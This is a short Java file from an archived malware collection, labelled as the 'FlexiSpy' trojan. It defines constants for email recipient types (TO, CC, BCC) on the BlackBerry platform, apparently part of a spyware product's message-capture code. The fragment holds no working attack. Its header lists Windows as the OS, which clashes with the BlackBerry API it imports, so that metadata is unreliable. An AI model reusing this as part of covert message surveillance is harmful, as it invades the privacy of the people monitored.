/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.event.constant;

import net.rim.device.api.util.Persistable;

public final class FxRecipientType implements Persistable {
	
	public static final FxRecipientType TO = new FxRecipientType(0);
	public static final FxRecipientType CC = new FxRecipientType(1);
	public static final FxRecipientType BCC = new FxRecipientType(2);
	private int id;
	
	private FxRecipientType(int id) {
		this.id = id;
	}

	public int getId() {
		return id;
	}
}
